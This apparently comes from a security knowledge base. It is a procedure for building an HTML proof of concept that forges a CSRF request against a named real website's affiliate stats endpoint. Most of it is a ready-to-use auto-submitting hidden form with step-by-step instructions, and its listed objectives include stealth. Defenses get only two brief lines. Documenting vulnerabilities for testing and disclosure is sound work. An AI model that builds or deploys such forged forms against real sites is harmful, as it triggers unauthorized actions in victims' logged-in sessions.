---
tags:
  - csrf
  - poc
  - html
  - forge
type: procedure
tools:
  - '[[tools/Browser-Unspecified]]'
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:27:15.977Z'
sub_techniques: []
id: 93f04f67-08ad-47c5-a954-d742961c2ed6
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Create-CSRF-Proof-of-Concept

## Summary

This procedure generates an HTML-based proof-of-concept to simulate a forged CSRF request targeting the Chaturbate stats endpoint.

## Description

The POC is a simple HTML file with a form that auto-submits modified parameters to /affiliates/stats, exploiting the absence of CSRF tokens. When opened in a browser with an active session, it triggers unauthorized changes.

## Requirements

1. Text editor for HTML creation
2. Knowledge of intercepted request parameters
3. Active Chaturbate session for testing

## Defense

Defensive measures and detection strategies:

- Require CSRF tokens in all forms and AJAX requests
- SameSite cookie attributes to block cross-site submissions

## Objectives

1. Craft a functional forged form
2. Ensure auto-submission for stealth
3. Target specific modifiable parameters

## Instructions

### Step 1: Create HTML File

**Context**: Build the basic structure.

Open a text editor and create a new file named Csrf.html.

### Step 2: Add Forged Form

**Context**: Embed the request simulation.

Insert the following HTML code, replacing parameters with modified values (e.g., custom dates):

```html
<!DOCTYPE html>
<html>
<body>
<form id="csrfForm" action="https://chaturbate.com/affiliates/stats" method="POST">
  <input type="hidden" name="start_date" value="2023-01-01">
  <input type="hidden" name="end_date" value="2023-12-31">
  <!-- Add other parameters from intercepted request -->
</form>
<script>document.getElementById('csrfForm').submit();</script>
</body>
</html>
```

### Step 3: Save and Prepare

**Context**: Ready for execution.

Save the file and ensure it's accessible locally.

> The script auto-submits the form upon loading, mimicking a cross-site attack.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Browser-Unspecified]]

## Tags

- csrf
- poc
